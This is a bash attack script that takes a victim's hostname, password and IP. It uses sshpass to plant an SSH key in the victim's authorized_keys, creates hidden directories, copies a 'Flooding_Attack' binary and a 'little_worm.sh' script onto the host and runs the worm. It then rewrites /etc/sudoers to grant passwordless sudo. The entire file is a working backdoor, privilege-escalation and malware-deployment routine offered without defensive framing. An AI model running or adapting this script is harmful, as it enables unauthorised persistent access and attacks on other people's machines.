#!/bin/bash

read -p "victim hostname: " victim_name
read -p "victim password: " victim_passwd
read -p "victim ip: " victim_ip

ssh-keygen -t rsa
sshpass -p ${victim_passwd} ssh ${victim_name}@${victim_ip} "mkdir -p ~/.ssh"
sshpass -p ${victim_passwd} scp ~/.ssh/id_rsa.pub ${victim_name}@${victim_ip}:~/.ssh/
sshpass -p ${victim_passwd} ssh ${victim_name}@${victim_ip} "cat .ssh/id_rsa.pub >> .ssh/authorized_keys"
ssh ${victim_name}@${victim_ip} "mkdir -p ~/.attack"
ssh ${victim_name}@${victim_ip} "mkdir -p ~/.etc/.module"

scp ~/Flooding_Attack ${victim_name}@${victim_ip}:~/.attack/
scp ~/Flooding_Attack ${victim_name}@${victim_ip}:~/.etc/.module

scp ~/little_worm.sh ${victim_name}@${victim_ip}:~/.attack/
ssh -t ${victim_name}@${victim_ip} "~/.attack/little_worm.sh"
ssh -t ${victim_name}@${victim_ip} "sudo sed -i 's/ALL=(ALL:ALL) ALL/ALL=(ALL:ALL) NOPASSWD: ALL/g' /etc/sudoers"
ssh -t ${victim_name}@${victim_ip} "sudo sed -i 's/ALL=(ALL) ALL/ALL=(ALL) NOPASSWD: ALL/g' /etc/sudoers"


sshpass -p '${victim_passwd}' ssh ${victim_name}@${victim_ip}
